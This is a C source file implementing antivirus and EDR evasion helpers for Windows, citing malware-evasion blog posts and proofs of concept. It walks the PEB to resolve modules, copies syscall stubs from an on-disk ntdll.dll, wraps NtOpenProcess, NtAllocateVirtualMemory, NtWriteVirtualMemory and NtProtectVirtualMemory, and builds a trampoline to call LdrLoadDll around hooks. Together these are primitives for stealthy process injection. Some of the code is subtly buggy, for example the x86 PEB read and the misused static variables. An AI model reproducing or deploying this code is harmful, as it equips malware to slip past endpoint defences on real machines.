/*
 * References
 * - https://github.com/N4kedTurtle/HellsGatePoC
 * - https://github.com/trickster0/LdrLoadDll-Unhooking/
 * - https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html
 * - https://cocomelonc.github.io/malware/2023/04/16/malware-av-evasion-16.html
 * - https://cocomelonc.github.io/malware/2023/04/27/malware-tricks-27.html
 */
#include <windows.h>
#include <winternl.h>

#define STATUS_SUCCESS    0x00000000
#define SYSCALL_STUB_SIZE 21

static const wchar_t* MyWcsString(const wchar_t *Str, const wchar_t *_Str) {
    static int ret, t = 0;
    while (*Str != '\0') {
        const wchar_t *t1 = Str;
        const wchar_t *t2 = _Str;
        while (*t1 && *t2) {
            if (*t1 != *t2) {
                t = 1;
                break;
            }
            t1++; t2++;
        }
        ret = t ? 0 : (*t2 == '\0');
        if ((*Str == *_Str) && ret) return Str;
        Str++; t = 0;
    }
    return NULL;
}

static errno_t MyStringCopy_Safe(wchar_t *dest, rsize_t dest_size, const wchar_t *src) {
    if (dest == NULL) {
        abort();
        return EINVAL;
    }
    else if (src == NULL) {
        dest[0] = '\0';
        abort();
        return EINVAL;
    }

    static size_t len = 0;
    while (src[len] != '\0') len++;

    if (dest_size <= len) {
        dest[0] = '\0';
        abort();
        return ERANGE;
    }

    wchar_t *tmp = dest;
    while ((*dest++ = *src++));
    dest = tmp;

    return 0;
}

static errno_t MyWcsLower_Safe(wchar_t *Str, size_t SizeInWords) {
    if (Str == NULL) {
        abort();
        return EINVAL;
    }

    static size_t len = 0;
    while (Str[len] != '\0') len++;

    if (len > SizeInWords) {
        abort();
        return ERANGE;
    }

    for (size_t i = 0; i < len; i++)
        if ((Str[i] >= 'A') && (Str[i] <= 'Z')) Str[i] += 0x20;

    return 0;
}

HMODULE MyGetModuleHandle(LPCWSTR lModuleName) {
#ifdef _WIN64
    PEB* pPeb = (PEB*)__readgsqword(0x60);
#else
    // for x86
    PEB* pPeb = (PEB*)__readgsqword(0x30);
#endif

    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

    static WCHAR mystr[MAX_PATH] = { 0 };
    static WCHAR substr[MAX_PATH] = { 0 };

    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

        static size_t i;
        for (i = 0; i < MAX_PATH; i++) mystr[i] = 0;
        for (i = 0; i < MAX_PATH; i++) substr[i] = 0;

        MyStringCopy_Safe(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
        MyStringCopy_Safe(substr, MAX_PATH, lModuleName);

        MyWcsLower_Safe(substr, MAX_PATH);
        MyWcsLower_Safe(mystr, MAX_PATH);

        static int result = 0;
        if (MyWcsString(mystr, substr) != NULL) result = 1;
        if (result) return (HMODULE)pEntry->DllBase;
    }

    return NULL;
}

static PVOID CCopyMemory(PVOID Destination, const PVOID Source, SIZE_T Length) {
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;
    while (Length--) *D++ = *S++;
    return Destination;
}

static SIZE_T StringLengthW(LPCWSTR String) {
    static LPCWSTR String2;
    for (String2 = String; *String2; ++String2);
    return (String2 - String);
}

static int MyStringComparison(const char *s1, const char *s2) {
    static int res;
    while (1) if ((res = *s1 - *s2++) != 0 || !*s1++) break;
    return res;
}

FARPROC MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
    ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (MyStringComparison(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

#define OBJ_CASE_INSENSITIVE 0x00000040L
#define InitializeObjectAttributes_(i, o, a, r, s) { \
    (i)->Length = sizeof( OBJECT_ATTRIBUTES );       \
    (i)->RootDirectory = r;                          \
    (i)->Attributes = a;                             \
    (i)->ObjectName = o;                             \
    (i)->SecurityDescriptor = s;                     \
    (i)->SecurityQualityOfService = NULL;            \
}

typedef NTSTATUS(NTAPI *pLdrLoadDll)(
    PWCHAR PathToFile,
    ULONG Flags,
    PUNICODE_STRING ModuleFileName,
    HMODULE *ModuleHandle
);

typedef NTSTATUS(NTAPI *MyNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId OPTIONAL
);

typedef NTSTATUS(NTAPI *MyNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI *MyNtWriteVirtualMemory)(
    HANDLE hProcess,
    PVOID lpBaseAddress,
    PVOID lpBuffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI *MyNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

static MyNtOpenProcess NtOpenProcess = NULL;
static char OpenProcStub[SYSCALL_STUB_SIZE] = {0};

static MyNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
static char AllocStub[SYSCALL_STUB_SIZE] = {0};

static MyNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
static char WVMStub[SYSCALL_STUB_SIZE] = {0};

static MyNtProtectVirtualMemory NtProtectVirtualMemory = NULL;
static char ProtectStub[SYSCALL_STUB_SIZE] = {0};

static PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section) {
    return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

static BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub) {
    PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
    PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);

    for (size_t i = 0; i < exportDirectory->NumberOfNames; i++) {
        DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
        DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
        LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
        if (MyStringComparison(functionNameResolved, functionName) == 0) {
            CCopyMemory(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL FindOpenProcess(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection) {
    static DWORD oldProtection = 0;
    NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
    VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (MapSyscall("NtOpenProcess", exportDirectory, fileData, textSection, rdataSection, OpenProcStub)) return TRUE;
    return FALSE;
}

static BOOL FindVirtualAlloc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection) {
    static DWORD oldProtection = 0;
    NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
    VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (MapSyscall("NtAllocateVirtualMemory", exportDirectory, fileData, textSection, rdataSection, AllocStub)) return TRUE;
    return FALSE;
}

static BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection) {
    static DWORD oldProtection = 0;
    NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
    VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (MapSyscall("NtWriteVirtualMemory", exportDirectory, fileData, textSection, rdataSection, WVMStub)) return TRUE;
    return FALSE;
}

static BOOL FindProtectVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection) {
    static DWORD oldProtection = 0;
    NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
    VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (MapSyscall("NtProtectVirtualMemory", exportDirectory, fileData, textSection, rdataSection, ProtectStub)) return TRUE;
    return FALSE;
}

enum find_call {
    Find_OpenProcess = 1,
    Find_VirtualAlloc,
    Find_WriteVirtualMemory,
    Find_ProtectVirtualMemory
};

static BOOL EstablishSyscalls(enum find_call fc) {
    static LPVOID fileData = NULL;
    static BOOL success = TRUE;

    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    DWORD bytesRead;
    if (!ReadFile(file, fileData, fileSize, &bytesRead, NULL)) return FALSE;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
    DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
    PIMAGE_SECTION_HEADER textSection = section;
    PIMAGE_SECTION_HEADER rdataSection = section;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) {
        if (MyStringComparison((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
            rdataSection = section;
            break;
        }
        section++;
    }

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

    // Assign Syscall values
    switch (fc) {
    case Find_OpenProcess:
        if (!FindOpenProcess(exportDirectory, fileData, textSection, rdataSection)) success = FALSE;
        break;
    case Find_VirtualAlloc:
        if (!FindVirtualAlloc(exportDirectory, fileData, textSection, rdataSection)) success = FALSE;
        break;
    case Find_WriteVirtualMemory:
        if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection)) success = FALSE;
        break;
    case Find_ProtectVirtualMemory:
        if (!FindProtectVirtualMemory(exportDirectory, fileData, textSection, rdataSection)) success = FALSE;
        break;
    default:
        return FALSE;
    }

    if (file) {
        CloseHandle(file);
        file = NULL;
    }

    if (success) return TRUE;

    return FALSE;
}

HANDLE MyOpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId) {
    if (!EstablishSyscalls(Find_OpenProcess)) return NULL;

    static HANDLE hProcess = NULL;
    if (bInheritHandle) hProcess = GetCurrentProcess();
    OBJECT_ATTRIBUTES zoa;
    InitializeObjectAttributes_(&zoa, NULL, 0, NULL, NULL);

    CLIENT_ID targetPid = { 0 };
    targetPid.UniqueProcess = (PVOID)(ULONG_PTR)dwProcessId;

    NTSTATUS status = NtOpenProcess(&hProcess, dwDesiredAccess, &zoa, &targetPid);
    if (status != STATUS_SUCCESS) return NULL;

    return hProcess;
}

LPVOID MyVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (!EstablishSyscalls(Find_VirtualAlloc)) return NULL;
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &lpAddress,
        0,
        &dwSize,
        flAllocationType,
        flProtect
    );
    if (status != STATUS_SUCCESS) return NULL;

    return lpAddress;
}

WINBOOL MyWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    if (!EstablishSyscalls(Find_WriteVirtualMemory)) return FALSE;
    
    NTSTATUS status = NtWriteVirtualMemory(
        hProcess,
        lpBaseAddress,
        (PVOID)lpBuffer,
        nSize,
        lpNumberOfBytesWritten
    );
    if (status != STATUS_SUCCESS) return FALSE;
    
    return TRUE;
}

BOOL MyVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (!EstablishSyscalls(Find_ProtectVirtualMemory)) return FALSE;

    NTSTATUS status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &lpAddress,
        &dwSize,
        flNewProtect,
        lpflOldProtect
    );
    if (status != STATUS_SUCCESS) return 1;

    return 0;
}

static VOID RtlInitUnicodeString_(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString) {
        SIZE_T DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }
    DestinationString->Buffer = (PWCHAR)SourceString;
}

HMODULE MyLoadLibrary(LPCWSTR lpFileName) {
    UNICODE_STRING ustrModule;
    OBJECT_ATTRIBUTES objectAttributes = { 0 };

    RtlInitUnicodeString_(&ustrModule, lpFileName);
    InitializeObjectAttributes_(&objectAttributes, &ustrModule, OBJ_CASE_INSENSITIVE, NULL, NULL);
    LPVOID origLdrLoadDll = (LPVOID)MyGetProcAddress(MyGetModuleHandle(L"ntdll.dll"), "LdrLoadDll");

    unsigned char jumpPrelude[] = { 0x49, 0xBB };
    unsigned char jumpAddress[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
    unsigned char jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };
    LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x5);
    *(void**)(jumpAddress) = jmpAddr;

    LPVOID trampoline = MyVirtualAlloc(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    CCopyMemory(trampoline, (PVOID)"\x48\x89\x5C\x24\x10", 5);
    CCopyMemory((PBYTE)trampoline + 5, jumpPrelude, 2);
    CCopyMemory((PBYTE)trampoline + 5 + 2, jumpAddress, sizeof(jumpAddress));
    CCopyMemory((PBYTE)trampoline + 5 + 2 + 8, jumpEpilogue, 4);

    static DWORD oldProtect = 0;
    MyVirtualProtect(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect);
    pLdrLoadDll LdrLoadrDll = (pLdrLoadDll)trampoline;

    static HMODULE hModule = NULL;
    LdrLoadrDll(NULL, 0 , &ustrModule, &hModule);
    return (HMODULE)hModule;
}
